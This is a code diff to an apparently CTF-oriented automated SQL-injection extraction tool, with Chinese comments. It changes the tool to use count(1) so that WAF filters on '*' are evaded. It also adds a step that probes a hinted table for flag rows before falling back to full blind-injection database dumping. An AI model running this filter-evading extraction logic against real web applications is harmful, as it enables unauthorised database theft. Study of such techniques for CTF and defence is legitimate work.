@@ -82,8 +82,9 @@ class ExtractionPipeline:
         return f"{col} like {lit}" if self.waf.is_filtered("=") else f"{col}={lit}"
 
     def _count(self) -> str:
-        """count 聚合（* 被滤时用 1，web209 类：count(*) 整包被拒）。"""
-        return "count(1)" if self.waf.is_filtered("*") else "count(*)"
+        """count 聚合：恒用 count(1)——语义等价 count(*)，且不惧 * 被滤
+        （web209/214 类：* 在黑名单时 count(*) 整包被拒，探测无从区分）。"""
+        return "count(1)"
 
     # ------------------------------------------------------------------ basic
     def version(self) -> str:
@@ -394,6 +395,24 @@ class ExtractionPipeline:
                 quick.version, quick.user = res.version, res.user
                 return quick
         self.log("INFO", f"[脱库] version={res.version} db={res.database} user={res.user}")
+        # 表名提示（web214 类：debug 回显给出基础查询表）——盲注全库枚举太贵，
+        # 先对提示表做 flag 优先探测，命中即收工
+        hint = getattr(self.s.spec, "table_hint", "")
+        if hint and self._is_blind():
+            try:
+                cols = self.list_columns(res.database, hint)
+            except OracleError:
+                cols = []
+            if cols:
+                rows = self.try_flag_first(res.database, hint, cols)
+                if rows:
+                    res.tables[res.database] = [hint]
+                    res.columns[(res.database, hint)] = cols
+                    res.rows[(res.database, hint)] = rows
+                    self._note("表名提示直取 flag 行",
+                               f"{res.database}.{hint}（跳过全库枚举）")
+                    return res
+            self.log("INFO", f"[脱库] 表名提示 {hint} 未命中 flag 行，回退全库枚举")
 
         res.databases = self.list_databases()
         self.log("INFO", f"[脱库] 所有数据库: {res.databases}")
